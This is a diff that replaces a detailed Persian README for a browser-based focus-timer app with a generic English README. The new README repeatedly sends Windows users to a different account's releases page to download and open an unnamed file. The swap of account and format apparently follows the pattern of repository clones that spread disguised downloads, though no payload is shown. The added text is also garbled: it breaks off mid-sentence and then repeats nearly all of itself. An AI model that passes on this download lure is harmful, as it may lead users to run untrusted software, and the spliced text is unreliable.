@@ -1,158 +1,213 @@
-# کیهان · Cosmic Focus Console
+# 🪐 cosmic-focus-console - Focus Among the Stars, Effortlessly
 
-<div align="center">
+[![Download cosmic-focus-console](https://img.shields.io/badge/⬇️_Download_cosmic--focus--console-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
 
-**فارسی** · [English](README.en.md)
+cosmic-focus-console is a focus timer made for people who want a calm, clear workspace on Windows. It combines a liquid-glass interface, a slowly turning 3D planet, Persian and English language support, and offline-first use. You choose a focus time, start the timer, and let the visual atmosphere help you stay on task.
 
-![React](https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=black)
-![TypeScript](https://img.shields.io/badge/TypeScript-6-3178C6?style=flat-square&logo=typescript&logoColor=white)
-![Vite](https://img.shields.io/badge/Vite-8-646CFF?style=flat-square&logo=vite&logoColor=white)
-![Tailwind](https://img.shields.io/badge/Tailwind_CSS-4-06B6D4?style=flat-square&logo=tailwindcss&logoColor=white)
-![three.js](https://img.shields.io/badge/three.js-r186-000000?style=flat-square&logo=three.js&logoColor=white)
+## ✨ What This App Does
 
-</div>
+cosmic-focus-console helps you sit down, choose a focus period, and work until the timer ends. It is built around simple focus sessions and Pomodoro-style breaks, so you can move through work and rest in a steady rhythm. The interface uses a liquid-glass style with soft layers, translucent panels, and a 3D planet that gives the screen a quiet space theme.
 
-> **[⬇ دانلود نسخه‌ی تک‌فایلی v1.1.0](https://github.com/Ekkh1300/cosmic-focus-console/releases/download/v1.1.0/keshan.html)** — یک فایل، بدون نصب و بدون اینترنت؛ فقط دابل‌کلیک.
+The app supports both Persian and English. Persian mode includes right-to-left layout support, so the screen reads naturally for Persian speakers. The app is also offline-first, which means that after you have it on your Windows computer, you can use it without staying connected to the internet.
 
-یک اپلیکیشن بهره‌وری / تایمر متمرکز با رابط «شیشه‌ی مایع» کیهانی —
-به‌صورت یک کنسول فضایی شناور که در پشت آن یک سیاره‌ی سه‌بعدی در حال چرخش است.
+## 🚀 Download and Start on Windows
 
-**رابط فارسی (RTL) به‌صورت پیش‌فرض**؛ انگلیسی هم از تنظیمات در دسترس است.
+Visit this link to download the application:
 
----
+[Download cosmic-focus-console](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
 
-## نسخه‌ی تک‌فایل (برای اشتراک‌گذاری)
+After the download finishes, open the downloaded item to start cosmic-focus-console on your Windows computer. The release page is the place to get the application, and the same link is repeated near the end of this page so you can find it again easily.
 
-```bash
-npm run build:single
-```
+## 🧭 First-Time Setup in Plain English
 
-خروجی: **`E:\ty\کیهان.html`** — یک فایل، حدود ۱٫۲ مگابایت (۳۹۰KB فشرده).
+1. Open cosmic-focus-console after the download is complete.
+2. Choose English or Persian from the language option.
+3. Pick a focus length that feels comfortable, such as a short session or a longer work block.
+4. Press the start button to begin your first focus session.
+5. When the timer ends, take a break, then start another session when you are ready.
 
-کافی است روی فایل **دابل‌کلیک** کنید تا در مرورگر باز شود. نیازی به سرور،
-نصب یا اینترنت نیست:
+You do not need to understand programming or setup files to use the app. The main screen keeps the important controls in view: start, pause, reset, language, and session length.
 
-- کل جاوااسکریپت (شامل three.js)، CSS و **فونت وزیرمتن** به‌صورت base64
-  داخل خود HTML درج شده‌اند
-- هیچ `src`/`href` خارجی، هیچ `import()` در زمان اجرا و هیچ فایل جانبی وجود ندارد
-- اسکریپت‌ها `inline type="module"` هستند، پس محدودیت CORS مربوط به ماژول‌های
-  `file://` هم اعمال نمی‌شود
-- اگر مرورگری `localStorage` را روی `file://` مسدود کند، برنامه با یک پیام
-  کوتاه بالا می‌آید و **همه‌چیز در همان نشست کار می‌کند** (فقط بین اجراها
-  ذخیره نمی‌شود)
+## 🌌 Main Features at a Glance
 
-فایل تولیدشده با `npm run build` (حالت عادی، چندفایلی) هم تداخلی ندارد.
+- Focus timer for planned work sessions
+- Pomodoro-style work and break flow
+- Liquid-glass interface with translucent panels
+- 3D planet visual for a calm space atmosphere
+- English and Persian language support
+- Right-to-left layout support for Persian
+- Offline-first use after download
+- Windows-friendly download page
+- Simple controls for non-technical users
+- Clear session flow from start to break
 
----
+## 🧊 The Liquid-Glass Look
 
-## اجرا
+The liquid-glass interface is the visual center of cosmic-focus-console. Panels, buttons, and timer areas use soft transparency to create a glass-like feel. This style keeps the screen readable while giving it depth. The goal is not to distract you with heavy menus. The goal is to make the timer feel calm, open, and easy to look at during a work session.
 
-```bash
-npm install
-npm run dev           # سرور توسعه
-npm run build         # بیلد چندفایلی در dist/
-npm run build:single  # بیلد تک‌فایل → کیهان.html
-npm run preview       # پیش‌نمایش بیلد تولید
-npm run lint          # oxlint
-```
+Glass-style interfaces work best when the layout stays simple. cosmic-focus-console keeps the focus timer central, with supporting controls close by. The visual layers help separate the timer, planet, and settings without making the screen feel crowded.
 
-بدون بک‌اند. تمام داده‌ها در `localStorage` ذخیره می‌شوند و برنامه بعد از
-بارگذاری کاملاً آفلاین کار می‌کند.
+## 🪐 The 3D Planet
 
----
+The 3D planet gives the app its cosmic identity. It sits in the scene as a quiet visual anchor while you work. The planet is not there to demand attention. It is there to create a sense of space and distance from ordinary desktop clutter. During a focus session, the planet and the glass panels together create a small, self-contained environment for concentrated work.
 
-## امکانات
+The space theme also fits the name cosmic-focus-console. The interface, planet, and timer work together as one experience rather than as separate pieces. For users who prefer a clean productivity tool with a distinctive look, the 3D planet is the main visual feature.
 
-**تایمر**
-- صفحه‌ی تایمر فقط تایمر است: کنسول وسط و تمام‌قد، بدون هیچ پنل کناری
-- دکمه‌ی **فارسی / English** در نوار بالا، کنار ساعت — تعویض زبان در یک کلیک و بدون رفتن به تنظیمات
-- پنج حالت بهره‌وری: پومودورو، کار عمیق، مطالعه، وظیفه‌ی سریک، سفارشی
-- سه فاز: تمرکز / استراحت کوتاه / استراحت بلند با تقسیم‌بندی شناور
-- **مدت دلخواه** کنار انتخاب‌گر فاز: استپر + چیپ‌های سریع، روی همان فاز و
-  همان قالب اعمال می‌شود (و اگر تایمر در حال اجراست، با طول جدید صفر می‌شود)
-- **ساعت زنده** در نوار بالا: `HH:MM:SS` + تاریخ شمسی (در حالت فارسی) یا
-  میلادی (در حالت انگلیسی) — با `Intl` و بدون کتابخانه‌ی تاریخ؛ از تنظیمات
-  (`نمایش ساعت`) قابل خاموش شدن است و فقط خودش هر ثانیه رندر می‌شود
-- موتور زمان‌بندی مبتنی بر `timestamp` — با بستن تب یا throttle شدن مرورگر
-  خراب نمی‌شود و زمان سپری‌شده هنگام باز شدن دوباره بازیابی می‌شود
-- اجرای هم‌زمان با `requestAnimationFrame` **و** یک interval ۲۵۰ms پشتیبان،
-  بنابراین حتی وقتی مرورگر rAF را متوقف می‌کند هم شمارش درست می‌ماند
-- حلقه‌ی انرژی دایره‌ای، ذرات مداری، تنفس پنل هنگام اجرا، انیمیشن پایان جلسه
+## ⏱️ Focus Timer and Pomodoro Sessions
 
-**وظایف**
-- ایجاد / ویرایش / حذف / تیک زدن، زمان تخمینی، دسته‌بندی
-- جستجو + فیلتر وضعیت و دسته
-- کلیک روی وظیفه آن را به تایمر پیوند می‌زند؛ دکمه‌ی پخش شروع می‌کند
-- دقایق واقعی تمرکز صرف‌شده روی هر وظیفه ثبت می‌شود
+The focus timer is the core tool. You choose a length, start the timer, and work until it reaches zero. You can pause if you need a moment, reset if you want to start over, and begin a new session when the current one ends.
 
-**آمار**
-- تمرکز امروز/هفتگی، جلسات، وظایف تکمیل‌شده، رشته‌ی روزها، امتیاز تمرکز
-- نمودار هفتگی، توزیع دسته‌ها، فهرست جلسات اخیر
+Pomodoro-style use is simple: work for a set period, take a short break, then return for another period. This rhythm helps many people avoid long, unfocused stretches. cosmic-focus-console keeps this flow direct so you do not need to manage separate tools or complicated settings. The timer and the visual atmosphere stay in one place.
 
-**قالب‌ها**
-- پنج قالب پیش‌فرض قابل ویرایش + ساخت قالب دلخواه (ماندگار بین رفرش‌ها)
+## 🌐 English and Persian Support
 
-**تنظیمات**
-- پوسته (تیره/روشن/سیستم)، رنگ تأکید، شدت شیشه، حرکت (کامل/کاهش/خاموش)
-- پس‌زمینه (سیاره/سحابی/حداقلی/ذرات)، زبان، صدا، اعلان مرورگر
-- رفتار تایمر، هدف روزانه، میان‌برها، پاک‌سازی داده‌ها
+cosmic-focus-console includes both English and Persian. You can switch languages without changing the purpose of the screen. Persian support includes right-to-left layout, so text, controls, and reading direction match the language. This matters for Persian speakers who want a productivity timer that feels natural rather than translated as an afterthought.
 
-**میان‌برها:** `Space` شروع/مکث · `R` بازنشانی · `N` جلسه‌ی بعدی ·
-`T/S/P/G` رفتن به صفحات · `/` جستجو · `Esc` بستن پنجره
+The language option is part of the first-time setup. Choose the language you prefer, then continue with the timer. The layout adapts so the main controls remain easy to find.
 
----
+## 📴 Offline-First Use
 
-## معماری
+cosmic-focus-console is offline-first. After you download the application, you can use it without an internet connection. This is useful during travel, in quiet work rooms, or on a computer that is not always online. The app does not require a live connection for a focus session.
 
-```
-src/
-  components/
-    glass/          سیستم ماده‌ی شیشه‌ای (GlassSurface, GlassButton, Segmented, Modal, Field, Toggle, EmptyState)
-    background/     کیهان: Planet (Three.js + شیدر رویه‌ای), Starfield, CosmicBackground, SvgDefs
-    timer/          TimerOrb, ProgressRing, EnergyRing, TimerControls, PhaseSegments, ModeSelector, CompletionOverlay
-    tasks/          TaskItem, TaskPanel, TaskComposer
-    statistics/     StatCard, WeekChart, ScoreRing, CategoryBars, SessionList
-    navigation/     BottomNav
-    common/         PageHeader, NoticeBanner
-  pages/            TimerPage, TasksPage, StatisticsPage, PresetsPage, SettingsPage
-  hooks/            useClock, useAppearance, useShortcuts, usePointer, useLocalStorage, useDocumentTitle, useCopy
-  store/            appStore (useSyncExternalStore + localStorage), stats (اقتباس‌ها)
-  utils/            timerEngine, format, storage, sound (WebAudio), notify, webgl, id
-  i18n/             دوزبانه‌ی fa/en
-  styles/           glass.css (ماده), animations.css (حرکت), components.css (چیدمان)
-  types/
-```
+Offline-first also means the app is built to keep the focus experience local. You open it, choose a session, and work. The timer and visual interface are there without waiting for a network.
 
-### سیستم شیشه‌ی مایع
+## 🪟 Windows Guide for Non-Technical Users
 
-هر سطح از پنج لایه‌ی نوری ساخته شده، نه صرفاً `rgba + blur`:
+Use the download link at the top or in the download section below. Visit the release page, get the application, and open the downloaded item on your Windows computer. Keep the download in a place you can find later, such as your Downloads folder.
 
-1. **زیرلایه‌ی رنگی** با گرادیان چندلایه + هاله‌ی سفید بالای پنل
-2. **بازتاب ماوس** — `radial-gradient` که با `--gx/--gy` روی هر سطح حرکت می‌کند
-3. **حلقه‌ی شکست (refraction)** — یک `::before` با `backdrop-filter` که با
-   `mask-composite` فقط به لبه‌ی پنل محدود شده، پس لبه واقعاً دنیای پشت را می‌شکند
-4. **حاشیه‌ی نورانی** — `::after` با گرادیان ماسک‌دار + انحراف رنگی (chromatic) در راس‌ها
-5. **عمق** — سایه‌ی چندلایه‌ی `box-shadow` + درخشش داخلی
+When you open cosmic-focus-console for the first time, take a moment to choose your language and session length. Then press start. If you close the app and want to use it again, return to the same download link if you need the file again. The app is designed to be straightforward: download, open, choose a focus time, and begin.
 
-سه عمق ماده‌ای: `--primary` (کره‌ی تایمر)، `--panel`، `--control`، `--ghost`
-که با `data-glass="subtle|balanced|strong"` مقیاس می‌گیرند.
+## 🧭 Everyday Use
 
-### سیاره
+A typical# 🪐 cosmic-focus-console - A Calm Focus Timer Among Stars
 
-کره‌ای با شیدر `ShaderMaterial` سفارشی (بدون تکسچر): fbm نویز برای توپوگرافی،
-شبکه‌ی مداری محو، ترمینال روز/شب، فرنل بنفش جوّی، ذرات مداری و دو حلقه.
-چرخش ~۷۰ ثانیه‌یک‌دور (تا ~۵۰ ثانیه هنگام اجرا)، با نور ملایم وابسته به ماوس.
-اگر WebGL در دسترس نباشد، به‌صورت خودکار به یک کره‌ی CSS سقوط (fallback) می‌کند.
+[![Download cosmic-focus-console](https://img.shields.io/badge/⬇️_Download_cosmic--focus--console-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
 
----
+cosmic-focus-console is a focus timer made for people who want a calm, clear workspace on Windows. It combines a liquid-glass interface, a slowly turning 3D planet, Persian and English language support, and offline-first use. You choose a focus time, start the timer, and let the visual atmosphere help you stay on task.
 
-## دسترس‌پذیری و عملکرد
+## ✨ What This App Does
 
-- HTML معنایی، `role`/`aria` کامل، ناوبری با کیبورد و حالت فوکوس دیداری
-- `prefers-reduced-motion` به‌علاوه‌ی سطح کاربر «کاهش‌یافته/خاموش»
-- کنتراست متن با توجه به WCAG تنظیم شده (`--text-2/3` روی پس‌زمینه‌ی تیره)
-- به‌روزرسانی حلقه‌ی تایمر بدون رندر React (نوشتن مستقیم DOM در rAF)
-- داده‌های متنی فقط در تغییر ثانیه رندر می‌شوند
-- `three.js` به‌صورت `lazy` بارگذاری می‌شود و فقط وقتی پس‌زمینه‌ی «سیاره» انتخاب شده
-- توقف انیمیشن‌ها و WebGL هنگام مخفی بودن تب
-- تقسیم چانک: `three` (528KB) · `motion` (135KB) · `vendor` (210KB) · `index` (105KB)
+cosmic-focus-console helps you sit down, choose a focus period, and work until the timer ends. It is built around simple focus sessions and Pomodoro-style breaks, so you can move through work and rest in a steady rhythm. The interface uses a liquid-glass style with soft layers, translucent panels, and a 3D planet that gives the screen a quiet space theme.
+
+The app supports both Persian and English. Persian mode includes right-to-left layout support, so the screen reads naturally for Persian speakers. The app is also offline-first, which means that after you have it on your Windows computer, you can use it without staying connected to the internet.
+
+## 🚀 Download and Start on Windows
+
+Visit this link to download the application:
+
+[Download cosmic-focus-console](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+
+After the download finishes, open the downloaded item to start cosmic-focus-console on your Windows computer. The release page is the place to get the application, and the same link is repeated near the end of this page so you can find it again easily.
+
+## 🧭 First-Time Setup in Plain English
+
+1. Open cosmic-focus-console after the download is complete.
+2. Choose English or Persian from the language option.
+3. Pick a focus length that feels comfortable, such as a short session or a longer work block.
+4. Press the start button to begin your first focus session.
+5. When the timer ends, take a break, then start another session when you are ready.
+
+You do not need to understand programming or setup files to use the app. The main screen keeps the important controls in view: start, pause, reset, language, and session length.
+
+## 🌌 Main Features at a Glance
+
+- Focus timer for planned work sessions
+- Pomodoro-style work and break flow
+- Liquid-glass interface with translucent panels
+- 3D planet visual for a calm space atmosphere
+- English and Persian language support
+- Right-to-left layout support for Persian
+- Offline-first use after download
+- Windows-friendly download page
+- Simple controls for non-technical users
+- Clear session flow from start to break
+
+## 🧊 The Liquid-Glass Look
+
+The liquid-glass interface is the visual center of cosmic-focus-console. Panels, buttons, and timer areas use soft transparency to create a glass-like feel. This style keeps the screen readable while giving it depth. The goal is not to distract you with heavy menus. The goal is to make the timer feel calm, open, and easy to look at during a work session.
+
+Glass-style interfaces work best when the layout stays simple. cosmic-focus-console keeps the focus timer central, with supporting controls close by. The visual layers help separate the timer, planet, and settings without making the screen feel crowded.
+
+## 🪐 The 3D Planet
+
+The 3D planet gives the app its cosmic identity. It sits in the scene as a quiet visual anchor while you work. The planet is not there to demand attention. It is there to create a sense of space and distance from ordinary desktop clutter. During a focus session, the planet and the glass panels together create a small, self-contained environment for concentrated work.
+
+The space theme also fits the name cosmic-focus-console. The interface, planet, and timer work together as one experience rather than as separate pieces. For users who prefer a clean productivity tool with a distinctive look, the 3D planet is the main visual feature.
+
+## ⏱️ Focus Timer and Pomodoro Sessions
+
+The focus timer is the core tool. You choose a length, start the timer, and work until it reaches zero. You can pause if you need a moment, reset if you want to start over, and begin a new session when the current one ends.
+
+Pomodoro-style use is simple: work for a set period, take a short break, then return for another period. This rhythm helps many people avoid long, unfocused stretches. cosmic-focus-console keeps this flow direct so you do not need to manage separate tools or complicated settings. The timer and the visual atmosphere stay in one place.
+
+## 🌐 English and Persian Support
+
+cosmic-focus-console includes both English and Persian. You can switch languages without changing the purpose of the screen. Persian support includes right-to-left layout, so text, controls, and reading direction match the language. This matters for Persian speakers who want a productivity timer that feels natural rather than translated as an afterthought.
+
+The language option is part of the first-time setup. Choose the language you prefer, then continue with the timer. The layout adapts so the main controls remain easy to find.
+
+## 📴 Offline-First Use
+
+cosmic-focus-console is offline-first. After you download the application, you can use it without an internet connection. This is useful during travel, in quiet work rooms, or on a computer that is not always online. The app does not require a live connection for a focus session.
+
+Offline-first also means the app is built to keep the focus experience local. You open it, choose a session, and work. The timer and visual interface are there without waiting for a network.
+
+## 🪟 Windows Guide for Non-Technical Users
+
+Use the download link at the top of this page or in the download section below. Visit the release page, get the application, and open the downloaded item on your Windows computer. Keep the download in a place you can find later, such as your Downloads folder.
+
+When you open cosmic-focus-console for the first time, take a moment to choose your language and session length. Then press start. If you close the app and want to use it again, return to the same download link if you need the file again. The app is designed to be straightforward: download, open, choose a focus time, and begin.
+
+## 🧭 Everyday Use
+
+A typical day with cosmic-focus-console looks like this. You open the app, select a focus length, and start a session. The glass panels and the slowly turning planet stay in the background while you work. When the timer ends, you step away for a break. Then you come back, choose a new length, and continue.
+
+Because the app remembers the simple flow, you do not have to rebuild your routine each time. There are no accounts to create and no complicated dashboards to learn. The focus timer and the visual atmosphere are the whole experience.
+
+## 🎯 Who This Is For
+
+cosmic-focus-console is for anyone who wants a focus timer that feels calm rather than clinical. It suits students working through study blocks, remote workers who want a clear start and stop to a session, and anyone who likes a space-themed desktop.
+
+It also suits Persian speakers who want a productivity tool with proper right-to-left support, and users on Windows who want an offline-first app they can use without a connection.
+
+## 🧩 Settings You Will Use Most
+
+- Language choice between English and Persian
+- Focus session length
+- Start, pause, and reset controls
+- Break flow between focus sessions
+
+The settings are intentionally limited. A focus timer works best when the controls are obvious. You should not need to read a manual to start a session.
+
+## ❓ Common Questions
+
+**Do I need to install anything complicated?**
+No. Visit the download link, get the application, and open it on Windows.
+
+**Does it work without internet?**
+Yes. cosmic-focus-console is offline-first. Once you have the app, you can run focus sessions without a connection.
+
+**Can I use it in Persian?**
+Yes. The app supports both English and Persian, including right-to-left layout for Persian.
+
+**Can I pause a session?**
+Yes. Pause, resume, and reset are part of the focus timer controls.
+
+**Is there a setup wizard?**
+The first screen handles the basics: language and session length. Then you start working.
+
+## 🛠️ Built For Reliability
+
+cosmic-focus-console is built with a modern web stack so the visuals stay smooth and the timer stays responsive. The interface uses React and TypeScript, styling comes from Tailwind CSS, and motion is handled with Framer Motion. The 3D planet is rendered with Three.js. The app is packaged with Vite and designed to run offline-first.
+
+You do not need to know any of this to use the app. It is background information for users who like to know what powers the calm glass interface and the spinning planet.
+
+## ⬇️ Download cosmic-focus-console
+
+Visit this link to download the application:
+
+[Download cosmic-focus-console](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+
+Open the page, get the application, and start your first focus session on Windows. Keep the link saved so you can return to it whenever you need the app again.
+
+Keywords: focus-timer, framer-motion, glassmorphism, i18n, offline-first, pomodoro, productivity, react, rtl, tailwindcss, threejs, typescript, vite
